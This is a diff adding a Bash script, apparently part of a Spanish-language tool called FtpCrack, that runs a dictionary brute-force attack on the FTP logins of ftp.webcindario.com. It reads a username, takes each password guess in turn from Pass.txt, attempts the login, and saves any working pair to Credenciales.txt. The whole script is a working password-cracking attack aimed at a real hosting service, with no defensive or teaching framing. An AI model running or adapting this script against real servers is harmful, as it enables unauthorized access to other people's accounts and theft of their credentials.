@@ -1,0 +1,59 @@
+
+# Variables de usr
+
+ip=$(echo "ftp.webcindario.com")
+usr=$(cat .usr)
+
+# Inicio de diccionario
+
+valor=p
+
+leer=$(cat .nm)
+
+suma=$(expr $leer + 1 |& tee .nm)
+
+line=$(sed -n $suma$valor Pass.txt)
+
+save=$(echo "$line" > .pass)
+
+# Fin de diccionario
+
+# Programa test
+
+bash .banner
+echo -e "\e[38;5;196m"
+echo "Probando contraseña $suma"
+echo ""
+echo "Usuario: $usr"
+echo "Contraseña: $line"
+echo ""
+
+ftp -inv ftp.webcindario.com<<FINFTP > .txt
+user $usr $line
+bye
+FINFTP
+
+
+auth=$(grep -o directory .txt)
+
+if [ "$line" = "" ]; then
+exit
+fi
+
+if [ "$auth" = "directory" ]; then
+bash .banner
+echo -e "\e[38;5;46m"
+echo "Credenciales que coinciden:"
+echo ""
+echo "Usuario: $usr"
+echo "Contraseña: $line"
+echo ""
+echo "Presiona una tecla para continuar..."
+read pause
+ol=$(echo "Serivdor: $ip Usuario: $usr Contraseña: $line" >> Credenciales.txt)
+bash FtpCrack.sh
+exit
+else
+bash .vc
+fi
+
